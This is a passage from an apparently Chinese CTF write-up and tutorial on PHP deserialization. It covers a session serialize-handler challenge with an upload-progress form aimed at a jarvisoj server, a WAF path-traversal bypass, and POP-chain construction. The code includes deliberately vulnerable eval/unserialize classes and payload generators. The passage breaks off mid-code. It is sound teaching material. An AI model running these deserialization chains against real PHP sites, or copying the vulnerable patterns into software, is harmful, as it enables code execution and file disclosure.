class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'sessiontest.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这题和上面差不多，就是缺少个反序列化函数，需要自己构造上传页面<br><img src="https://s2.ax1x.com/2019/11/02/KLKBMq.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session 上传进度</span><br><span class="line">当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</span><br><span class="line">当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</span><br></pre></td></tr></table></figure></p><p>upload.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'show_source("Here_1s_7he_fl4g_buT_You_Cannot_see.php");'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/02/KOkctI.png" alt="image"></p><h4 id="0x03-icq第二季"><a href="#0x03-icq第二季" class="headerlink" title="0x03 icq第二季"></a>0x03 icq第二季</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test =<span class="string">"index.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;file:"</span>.<span class="keyword">$this</span>-&gt;test.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var=<span class="string">'success'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;var.</span><br><span class="line">            <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Come</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k = &gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>, <span class="string">""</span>, $str);</span><br><span class="line">        $str=str_replace(<span class="string">'/../'</span>, <span class="string">''</span>, $str);</span><br><span class="line">        $str=str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $str);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">get_dir</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        print_r(scandir(<span class="string">"/tmp"</span>.$path));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span></span></span><br><span class="line"><span class="function">    <span class="title">execute</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"get_dir"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), (<span class="keyword">$this</span>-&gt;args));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> Welcome();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;file:"</span> .<span class="keyword">$this</span>-&gt;test.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var=<span class="string">'success'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="keyword">new</span> Come();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;var.<span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Come</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method=<span class="string">'get_dir'</span>    ;</span><br><span class="line">    <span class="keyword">public</span> $args=<span class="keyword">array</span>(<span class="string">'args'</span>=&gt;<span class="string">"/..././var/www/html"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'/../'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_dir</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">        print_r(scandir(<span class="string">"/tmp"</span>.$path));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;method.<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"get_dir"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), (<span class="keyword">$this</span>-&gt;args));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Monitor();</span><br><span class="line"></span><br><span class="line">$c = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $c.<span class="string">"\n"</span>;</span><br><span class="line">unserialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h4 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</span><br></pre></td></tr></table></figure><h4 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</span><br></pre></td></tr></table></figure><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s1 = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        $s1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> 